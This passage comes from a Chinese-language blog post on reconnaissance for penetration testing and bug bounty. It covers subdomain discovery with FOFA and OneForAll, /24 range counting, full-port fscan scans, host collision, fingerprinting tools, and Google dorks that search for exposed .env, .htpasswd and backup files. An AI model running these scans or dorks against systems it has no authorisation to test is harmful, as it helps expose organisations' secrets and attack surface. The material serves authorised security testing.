class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> openpyxl <span class="hljs-keyword">import</span> Workbook<br><br>company_pattern = <span class="hljs-string">r&#x27;\[Unit\]: ([\u4e00-\u9fff]+) \[Type\]&#x27;</span><br>record_pattern = <span class="hljs-string">r&#x27;\[icpCode\]: ([京津沪渝黑吉辽蒙冀晋陕宁甘青新藏川贵云粤桂琼苏浙皖鲁闽赣湘鄂豫][A-Z]?\d?-?[ICP备]*\d&#123;4,10&#125;号)-&#x27;</span><br>url_pattern = <span class="hljs-string">r&#x27;www\.((?:\d&#123;1,3&#125;\.)&#123;3&#125;\d&#123;1,3&#125;|[a-zA-Z0-9-]+\.[a-zA-Z]&#123;2,&#125;)&#x27;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    content = file.read()<br><br>companies = re.findall(company_pattern, content)<br>records = re.findall(record_pattern, content)<br>urls = re.findall(url_pattern, content)<br><br>max_len = <span class="hljs-built_in">max</span>(<span class="hljs-built_in">len</span>(companies), <span class="hljs-built_in">len</span>(records), <span class="hljs-built_in">len</span>(urls))<br>companies.extend([<span class="hljs-string">&#x27;&#x27;</span>] * (max_len - <span class="hljs-built_in">len</span>(companies)))<br>records.extend([<span class="hljs-string">&#x27;&#x27;</span>] * (max_len - <span class="hljs-built_in">len</span>(records)))<br>urls.extend([<span class="hljs-string">&#x27;&#x27;</span>] * (max_len - <span class="hljs-built_in">len</span>(urls)))<br><br>workbook = Workbook()<br>sheet = workbook.active<br>sheet.title = <span class="hljs-string">&quot;Result Data&quot;</span><br><br>sheet.append([<span class="hljs-string">&#x27;公司名&#x27;</span>, <span class="hljs-string">&#x27;备案号&#x27;</span>, <span class="hljs-string">&#x27;网站地址&#x27;</span>])<br><br><span class="hljs-keyword">for</span> company, record, url <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(companies, records, urls):<br>    sheet.append([company, record, url])<br><br>workbook.save(<span class="hljs-string">&#x27;result.xlsx&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据已提取并保存到 result.xlsx 文件中。&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h3><p>获取方法：1、fofa、hunter上直接导出、2、子域名挖掘工具</p><h4 id="1、暗黑搜索引擎"><a href="#1、暗黑搜索引擎" class="headerlink" title="1、暗黑搜索引擎"></a>1、暗黑搜索引擎</h4><p>主要围绕主域名、公用名、组织，进行手工查询，由于各大引擎的搜索语法大同小异，就以fofa为例：</p><p>使用搜索引擎时很重要的一点，都使用<strong>all模式</strong>，因为fofa默认展示1年内的资产、hunter则是一个月，使用all模式则可以获取更多边缘资产。</p><p>fofa语句1：domain&#x3D;”<domain>“||cert&#x3D;”<domain>“</p><p>由于一般主域名都很多，我们可以写一个搜索语法小脚本（针对domain、cert）：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;zhu.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-built_in">file</span>:<br>    <span class="hljs-keyword">lines</span> = <span class="hljs-built_in">file</span>.readlines()<br><br>output = []<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">line</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">lines</span>:<br>    <span class="hljs-built_in">line</span> = <span class="hljs-built_in">line</span>.strip()<br>    output.append(f<span class="hljs-string">&#x27;domain=&quot;&#123;line&#125;&quot;||cert=&quot;&#123;line&#125;&quot;&#x27;</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> result_file:<br>    result_file.<span class="hljs-built_in">write</span>(<span class="hljs-string">&quot;||&quot;</span>.join(output))<br><br>print(<span class="hljs-string">&quot;数据已成功写入到 result.txt 文件中。&quot;</span>)<br></code></pre></td></tr></table></figure><p>转化为：</p><p><img src="https://s2.loli.net/2024/12/19/TL7VJ3jpGdMAaXe.png" alt="image-20241216001713335"></p><p>再从中去提取网站的证书中的  公用名  和  组织名，然后进一步搜索。</p><p>主要语法：fofa：**domain&#x3D;”<domain>“||cert&#x3D;”&lt;公用名&gt;”||cert&#x3D;”&lt;组织&gt;”**，平常除了主域名、公用名之外，主要就关注https网站证书中的”组织”，因为有时候组织名可以让我们收集更多子域名。我们查看证书时，也要多综合收集组织名，一定要多搜集几个。</p><p><img src="https://s2.loli.net/2024/12/16/JeDWuQGRg1S57UP.png" alt="image-20241216001719382"></p><p>除了在看证书时候收集”组织名”，我们还可以通过官方的证书站（crt.sh）搜搜企业的拼音，查找一些组织名（特别是英文组织名）</p><p><img src="https://s2.loli.net/2024/12/19/HjcEJ7dIklC4T9X.png" alt="image-20241216001726303"></p><p>再从中提取部分英文组织名搜集好然后拼接到脚本得到的语法中，集合就可以获取很全的子域名列表的了。</p><p>当然有条件可以加入图标<strong>icon</strong>的搜索，只需要把下图的网站图片的地址的hash计算出来，添加到搜索中就行了：</p><p>fofa：domain&#x3D;”<domain>“||cert&#x3D;”&lt;公用名&gt;”||cert&#x3D;”&lt;组织&gt;”||icon_hash&#x3D;”&lt;hash值&gt;”</p><p><img src="https://s2.loli.net/2024/12/19/ijLgoqtYJBSmpH7.png" alt="image-20241216001738554"></p><p>计算的脚本有很多，单个的话，可以使用密探足以</p><p><img src="https://s2.loli.net/2024/12/19/MwIqhoBmFCSfRr4.png" alt="image-20241216001746033"></p><p>对于批量的ICON收集，则可以使用httpx，然后可以像之前c段统计一样，提取几个重复率高的值进行查询</p><p><img src="https://s2.loli.net/2024/12/19/SZhQWzdsmlVcpaD.png" alt="image-20241216001753767"></p><p>最终的子域名收集：</p><p>简化的fofa语法：还有很多主域名和组织名没有加上去，只以一个站点为例，可见量之大</p><p>icon_hash&#x3D;”126806951”||domain&#x3D;”baidu.com”||cert&#x3D;”baidu.com”||cert&#x3D;”Beijing Baidu Netcom Science Technology Co., Ltd”</p><p><img src="https://s2.loli.net/2024/12/19/X6gbCR2GtaOeJ8D.png" alt="image-20241216001804334"></p><h4 id="2、工具"><a href="#2、工具" class="headerlink" title="2、工具"></a>2、工具</h4><p>2.1 Oneforall</p><p>在配置好下图中的api，妥妥的子域名收集神器！！！其收集子域名的方式包含了：证书透明度、常规检查收集子域（域传送漏洞利用、检查跨域策略文件、检查HTTPS证书、检查内容安全策略、检查robots文件、检查sitemap文件、利用NSEC记录遍历DNS域）、网络爬虫收集子域名、利用DNS数据集收集子域、DNS查询、威胁情报平台、搜索引擎、子域名爆破、子域置换等等几乎全面的方法。</p><p><img src="https://s2.loli.net/2024/12/19/VjAylZpT8O4gweu.png" alt="image-20241216001816038"></p><p>然后把搜集到的所有主域名仍targets.txt中，直接梭哈！</p><p>命令：<code>python oneforall.py --targets targets.txt --brute True run</code></p><p>即可，不过谨记，一定不能完全依靠工具，必须要依靠手动的收集或者自写脚本处理！</p><p>2.2 <a href="https://github.com/M0nster3/OneLong">Onelong</a></p><p>这也是一个综合性不错的信息工具，不过也要配置不少api。主要可以直接根据单个组织（结合了<a href="https://github.com/wgpsec/ENScan_GO">ENScan_GO</a>收集企业的一些方法，但是还是比不上原工具）来进行主子域名收集、指纹识别（一般）、app、小程序搜集，效果还不错！同时还集成了一些邮箱的收集、轻微漏洞扫描的功能。正对一些大型资产可用，中小型资产的话除了子域名收集还行以外，其他模块还是不如手动。</p><p>3、偏僻子域名寻找的方法</p><p><a href="https://otx.alienvault.com/api/v1/indicators/domain/baidu.com/url_list?limit=100&page=1">https://otx.alienvault.com/api/v1/indicators/domain/baidu.com/url_list?limit=100&amp;page=1</a></p><p>替换上述的baidu.com，然后从burp的响应包中提取hostname即可，也可以直接把limit调大一下，一次性提取</p><h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>用手动法，通过主域名的初步查询，从https子域名筛选出公用名和几个关键的中文组织名。再用crt.sh，通过指定主域名，获得几乎全部的英文组织名。这样再把他们全部串在一起用cert语法、icon语法查询得到搜索引擎的结果，其次就是使用oneforall，最后综合并去重上述的两个结果，即可得到最全的结果！！！！</p><p>整理全部的url和IP（oneforall、搜索引擎导出），一定要把url和ip各自整理一个文本（因为oneforall和搜索引擎得到的ip不一定对，很大可能是cdn）。</p><p>针对每一个ip分别生成http协议和https协议的列表，对url差哪个协议及添加协议（小脚本实现），整合一下得到目标（如果资产比较多，可以测活一下)——url.txt——</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment">#协议添加小脚本</span><br><br><span class="hljs-comment"># 打开文件web.txt读取内容</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;web.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-built_in">file</span>:<br>    <span class="hljs-keyword">lines</span> = <span class="hljs-built_in">file</span>.readlines()<br><br><span class="hljs-comment"># 处理每一行内容，检查并添加必要的前缀</span><br>processed_lines = []<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">line</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">lines</span>:<br>    <span class="hljs-built_in">line</span> = <span class="hljs-built_in">line</span>.strip()  <span class="hljs-comment"># 去除行尾的换行符等空白字符</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">line</span>.startswith(<span class="hljs-string">&#x27;http://&#x27;</span>):<br>        processed_lines.append(<span class="hljs-built_in">line</span>)  <span class="hljs-comment"># 如果已经有http://开头，保持原样</span><br>        processed_lines.append(<span class="hljs-string">&#x27;https://&#x27;</span> + <span class="hljs-built_in">line</span>[<span class="hljs-number">7</span>:])  <span class="hljs-comment"># 添加https://前缀</span><br>    elif <span class="hljs-built_in">line</span>.startswith(<span class="hljs-string">&#x27;https://&#x27;</span>):<br>        processed_lines.append(<span class="hljs-built_in">line</span>)  <span class="hljs-comment"># 如果已经有https://开头，保持原样</span><br>        processed_lines.append(<span class="hljs-string">&#x27;http://&#x27;</span> + <span class="hljs-built_in">line</span>[<span class="hljs-number">8</span>:])  <span class="hljs-comment"># 添加http://前缀</span><br>    <span class="hljs-keyword">else</span>:<br>        processed_lines.append(<span class="hljs-string">&#x27;http://&#x27;</span> + <span class="hljs-built_in">line</span>)  <span class="hljs-comment"># 添加http://前缀</span><br>        processed_lines.append(<span class="hljs-string">&#x27;https://&#x27;</span> + <span class="hljs-built_in">line</span>)  <span class="hljs-comment"># 添加https://前缀</span><br><br><span class="hljs-comment"># 将处理后的内容写入url.txt文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;url.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-built_in">file</span>:<br>    <span class="hljs-keyword">for</span> <span class="hljs-built_in">line</span> <span class="hljs-keyword">in</span> processed_lines:<br>        <span class="hljs-built_in">file</span>.<span class="hljs-built_in">write</span>(<span class="hljs-built_in">line</span> + <span class="hljs-string">&#x27;\n&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="ip全端口-c段"><a href="#ip全端口-c段" class="headerlink" title="ip全端口+c段"></a>ip全端口+c段</h3><p><strong>流程</strong>：得到url，单独提取其中的域名和IP，然后针对域名使用——<a href="https://github.com/EdgeSecurityTeam/Eeyes">Eeyes</a>——进行解析和cdn基础识别，去重整合得到部分完整的IP，提取占比大的c段，整合到ip中——ip.txt——，整体使用fscan全端口扫描，得到——port.txt——</p><ul><li>url.txt中提取域名、ip</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># 定义正则表达式，分别匹配 IP 地址和子域名</span><br>ip_pattern = <span class="hljs-string">r&quot;\b\d&#123;1,3&#125;(?:\.\d&#123;1,3&#125;)&#123;3&#125;\b&quot;</span><br>domain_pattern = <span class="hljs-string">r&quot;(?:https?://)?([a-zA-Z0-9-]+\.[a-zA-Z0-9.-]+\.[a-zA-Z]&#123;2,&#125;)&quot;</span><br><br><span class="hljs-comment"># 打开 url.txt 读取内容</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;url.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> infile:<br>    content = infile.read()<br><br><span class="hljs-comment"># 提取 IP 地址并保存到 ip.txt</span><br>ip_matches = re.findall(ip_pattern, content)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;ip.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> ipfile:<br>    <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> <span class="hljs-built_in">sorted</span>(<span class="hljs-built_in">set</span>(ip_matches)):<br>        ipfile.write(ip + <span class="hljs-string">&quot;\n&quot;</span>)<br><br><span class="hljs-comment"># 提取子域名并保存到 ym.txt</span><br>domain_matches = re.findall(domain_pattern, content)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;ym.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> domainfile:<br>    <span class="hljs-keyword">for</span> domain <span class="hljs-keyword">in</span> <span class="hljs-built_in">sorted</span>(<span class="hljs-built_in">set</span>(domain_matches)):<br>        domainfile.write(domain + <span class="hljs-string">&quot;\n&quot;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;IP 地址提取完成，结果已保存到 ip.txt&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;子域名提取完成，结果已保存到 ym.txt&quot;</span>)<br><br></code></pre></td></tr></table></figure><ul><li>Eeyes，单独把上述的ym.txt扔入Eeyes中，提取ip</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Eeyes -l ym.txt<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/19/kEaQNhtAGsjXZf5.png" alt="image-20241216001845941"></p><p>提取其中的ip脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#Eeyes提取脚本</span><br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># 定义正则表达式，匹配 IP 地址或域名</span><br>pattern = <span class="hljs-string">r&quot;\d+\.\d+\.\d+\.\d+&quot;</span><br><br><span class="hljs-comment"># 打开 url.txt 读取内容，并在 ipym.txt 中写入匹配结果</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;Eeyes.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> infile, <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;ip2.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> outfile:<br>    content = infile.read()<br>    matches = re.findall(pattern, content)<br><br>    <span class="hljs-comment"># 去重并按顺序写入结果</span><br>    <span class="hljs-keyword">for</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">sorted</span>(<span class="hljs-built_in">set</span>(matches)):<br>        outfile.write(<span class="hljs-keyword">match</span> + <span class="hljs-string">&quot;\n&quot;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;提取完成，结果已保存到 ip2.txt&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/19/6LHFXMft2iqw9Kz.png" alt="image-20241216001852620"></p><p>然后整合到ip.txt中就可</p><ul><li>c段提取</li></ul><p>因为一些比较大的产业，很大可能会在卖服务器IP时是按c段买的，我们就可以利用这一点，说不定还可以获取不少隐蔽的站点等等。</p><p>根据ip.txt中的数据，提取c段的重复率</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&#x27;&#x27;&#x27;<br><span class="hljs-comment"># 打开原始的 IP 地址文件</span><br><span class="hljs-keyword">with</span> open(&#x27;ip.txt&#x27;, &#x27;r&#x27;) <span class="hljs-keyword">as</span> <span class="hljs-built_in">file</span>:<br>    lines = <span class="hljs-built_in">file</span>.readlines()<br><br><span class="hljs-comment"># 处理每个 IP 地址，转换为 C 段，并去除重复</span><br>c_segment_ips_set = <span class="hljs-keyword">set</span>()<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>    ip = line.strip()  <span class="hljs-comment"># 移除每行末尾的换行符</span><br>    base_ip = ip.rsplit(&#x27;.&#x27;, <span class="hljs-number">1</span>)[<span class="hljs-number">0</span>]  <span class="hljs-comment"># 移除最后一个点号后的部分</span><br>    c_segment_ip = f<span class="hljs-string">&quot;&#123;base_ip&#125;.0/24&quot;</span><br>    c_segment_ips_set.add(c_segment_ip)<br><br><span class="hljs-comment"># 将转换后的 C 段 IP 地址写入到新文件</span><br><span class="hljs-keyword">with</span> open(&#x27;c段.txt&#x27;, &#x27;w&#x27;) <span class="hljs-keyword">as</span> <span class="hljs-built_in">file</span>:<br>    <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> c_segment_ips_set:<br>        <span class="hljs-built_in">file</span>.<span class="hljs-built_in">write</span>(ip + &#x27;\n&#x27;)<br><br>print(<span class="hljs-string">&quot;完成 IP 转换和去重，结果已保存到 &#x27;Modified_IP.txt&#x27;&quot;</span>)<br><br>&#x27;&#x27;&#x27;<br><br><span class="hljs-keyword">from</span> collections import Counter<br><br><span class="hljs-comment"># 打开原始的 IP 地址文件</span><br><span class="hljs-keyword">with</span> open(&#x27;ip.txt&#x27;, &#x27;r&#x27;) <span class="hljs-keyword">as</span> <span class="hljs-built_in">file</span>:<br>    lines = <span class="hljs-built_in">file</span>.readlines()<br><br><span class="hljs-comment"># 处理每个 IP 地址，转换为 C 段</span><br>c_segment_ips = []<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>    ip = line.strip()  <span class="hljs-comment"># 移除每行末尾的换行符</span><br>    base_ip = ip.rsplit(&#x27;.&#x27;, <span class="hljs-number">1</span>)[<span class="hljs-number">0</span>]  <span class="hljs-comment"># 获取 C 段（去除最后一个点号后的部分）</span><br>    c_segment_ip = f<span class="hljs-string">&quot;&#123;base_ip&#125;.0/24&quot;</span><br>    c_segment_ips.append(c_segment_ip)<br><br><span class="hljs-comment"># 统计每个 C 段的出现次数</span><br>c_segment_counts = Counter(c_segment_ips)<br><br><span class="hljs-comment"># 按出现次数从高到低排序</span><br>sorted_c_segments = sorted(c_segment_counts.items(), key=lambda <span class="hljs-built_in">item</span>: <span class="hljs-built_in">item</span>[<span class="hljs-number">1</span>], <span class="hljs-built_in">reverse</span>=True)<br><br><span class="hljs-comment"># 将排序结果写入到新文件 c段.txt</span><br><span class="hljs-keyword">with</span> open(&#x27;c段.txt&#x27;, &#x27;w&#x27;) <span class="hljs-keyword">as</span> <span class="hljs-built_in">file</span>:<br>    <span class="hljs-keyword">for</span> c_segment, <span class="hljs-built_in">count</span> <span class="hljs-keyword">in</span> sorted_c_segments:<br>        <span class="hljs-built_in">file</span>.<span class="hljs-built_in">write</span>(f<span class="hljs-string">&quot;&#123;c_segment&#125; 出现次数: &#123;count&#125;\n&quot;</span>)<br><br>print(<span class="hljs-string">&quot;完成 C 段 IP 的统计、排序和保存，结果已保存到 &#x27;c段.txt&#x27;&quot;</span>)<br><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/19/MPqcVpuLAgnbUTr.png" alt="image-20241216001900854"></p><p>挑选出现次数多得比较突出的c段，放于ip.txt中</p><p>这里推荐一个我自写的python项目，用来实现可视化</p><p>项目地址：<a href="https://github.com/Yf3te/Yf_UI/">https://github.com/Yf3te/Yf_UI/</a></p><p><img src="https://s2.loli.net/2024/12/19/hIA9eOJBSPYLEMo.png" alt="image-20241219202459429"></p><ul><li>全端口扫描，祭出神器fscan</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fscan</span>.exe -hf ip.txt -t <span class="hljs-number">3000</span> -p <span class="hljs-number">1</span>-<span class="hljs-number">65535</span> -num <span class="hljs-number">100</span> -np -o port.txt<br></code></pre></td></tr></table></figure><p>扫描结果：</p><p><img src="https://s2.loli.net/2024/12/19/p2ot14i6yAXj7mU.png" alt="image-20241102220159807"></p><p>得到port.txt</p><p>最终配合http&#x2F;https协议获取最全web资产合集web.txt，一般而言，我们应该会直接进行测活，并重新整理存活的站点测试。但是有时候会遇到一种情况，就是主站点访问为空或者重定向，但是我们添加某个路由之后又能正常访问，这就可能让我们丢失一些可能存在漏洞的目标，所以还有一道工序</p><h3 id="Host碰撞"><a href="#Host碰撞" class="headerlink" title="Host碰撞"></a>Host碰撞</h3><p>那就是Host碰撞。host碰撞旨在发现隐蔽的边缘资产，原理的话就不过多赘述了</p><p>这次目标就不要放在一些过于正常的界面，比如：Centos默认界面、nginx默认界面，还有就是访问不正常的界面，比如：30X、403、404、50X等等。</p><p>如果我们的时间多的话，我们就可以把上面web.txt文件中的ip、域名（都带端口）<strong>全部</strong>分离出来，可以用这个项目，<a href="https://github.com/Secur1ty0/Idregex">https://github.com/Secur1ty0/Idregex</a></p><p><img src="https://s2.loli.net/2024/12/19/74wFNQEhtkXynHr.png" alt="image-20241217162814133"></p><p>问就是好用，而且还可以生成一下fofa、hunter的语法。</p><p><img src="https://s2.loli.net/2024/12/19/XctzGeukBrfYWH3.png" alt="image-20241217161628860"></p><p>如果时间比较紧促，就先可以测活然后再进行host碰撞</p><p>web.txt测活选用Tscanplus的内置工具，挺好用的。</p><p><img src="https://s2.loli.net/2024/12/19/TSoEYu54X68zRhH.png" alt="image-20241217161830325"></p><p>再根据上面的小脚本直接分类筛选出<strong>不正常</strong>的ip、域名，都要带端口</p><p>直接开始host碰撞</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>HostCollision.<span class="hljs-keyword">jar </span>-ifp ips.txt -hfp hosts.txt<br></code></pre></td></tr></table></figure><p>直接上指纹识别</p><h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><p><strong>定义</strong></p><p>指纹识别就像指纹一样来识别web站点的前端源代码、目录中的信息来识别某个系统的名称、登录框等功能。</p><p><strong>意义</strong></p><p>用来识别脆弱的易攻破的资产</p><p><strong>工具</strong></p><p>1、<a href="https://github.com/lemonlove7/EHole_magic">Ehole魔改版</a></p><p>针对没什么waf的资产（edusrc还是不适合用）强推，非常的快！同时还会带有对重点目标进行目录侦察的效果（poc.ini中设置），指纹库也比较强，不过可惜的是状态码的颜色看起来差点感觉。</p><p><img src="https://s2.loli.net/2024/12/16/zVB5MqShKQGducg.png" alt="image-20241216001919244"></p><p><img src="https://s2.loli.net/2024/12/19/TQPUFBDeEXtgfrx.png" alt="image-20241216001924811"></p><p>爆破一些敏感路径，但是也有弊端，因为一般而言，网站都有waf，爆破敏感路径可能会被直接封ip，就老实了</p><p><img src="https://s2.loli.net/2024/12/16/2GXs76Yz8mfe3DV.png"></p><p>2、简单对比一下，其他的指纹识别工具</p><p>P1finger+红队行动下的重点资产指纹识别工具</p><p>感觉一般</p><p><img src="https://s2.loli.net/2024/12/16/YUWL8S1hMZvIzBu.png" alt="image-20241216001938097"></p><p>httpx（有计算favicon.icon的功能）（httpx.exe -l 1.txt -sc -title -tech-detect）</p><p>展示效果很醒目，但是指纹库感觉一般</p><p><img src="https://s2.loli.net/2024/12/16/MimAEvxV6lYGROK.png" alt="image-20241216001946540"></p><p>hfinger</p><p>展示看起来一般，但是指纹库、识别方式较好，用于快速侦察比较脆弱的目标</p><p><img src="https://s2.loli.net/2024/12/19/DOPmqBWQfYj7ItH.png" alt="image-20241216001959055"></p><p>TigerV1.0(2).2  </p><p>感觉指纹库和指纹探查一般</p><p><img src="https://s2.loli.net/2024/12/19/VNEl8RxwTkj5ZDd.png" alt="image-20241216002013154"></p><p>Tidefinger</p><p>这工具具有端口探测的功能，但是感觉指纹侦察一般</p><p><img src="https://s2.loli.net/2024/12/16/qP9eNO4WzxTgFyK.png" alt="image-20241216002028639"></p><p>spray</p><p>感觉输出不太舒服，但是指纹库还行</p><p><img src="https://s2.loli.net/2024/12/16/a6hMyLWdm1sIPfS.png" alt="image-20241216002035972"></p><p>综上所述：</p><p>对于waf弱的攻防、测试，带有poc检测的神器<strong>ehole魔改</strong>，毋庸置疑</p><p>但是对于waf比较强的则可以关闭ehole魔改的POC模块，即可</p><h3 id="单个站点收集"><a href="#单个站点收集" class="headerlink" title="单个站点收集"></a>单个站点收集</h3><p>主要看能不能找一些敏感文件，方式：google黑语法、github泄露、快照泄露</p><p>1、google黑语法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go">site:target.com filetype:.doc | .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv<br><br>site:target.com ext:log | ext:txt | ext:conf | ext:cnf | ext:ini | ext:env | ext:sh | ext:bak | ext:backup | ext:swp | ext:old | ext:~ | ext:git | ext:svn | ext:htpasswd | ext:htaccess）<br></code></pre></td></tr></table></figure><p>不限于此：</p><p>Google Dorks 获取漏洞赏金（雨苁）：<a href="https://www.ddosi.org/dork/">https://www.ddosi.org/dork/</a></p><p>懒人dork：  <a href="https://iamunixtz.github.io/LazyDork/">https://iamunixtz.github.io/LazyDork/</a></p><p>特别是在edusrc上用得很频繁</p><figure class="highlight 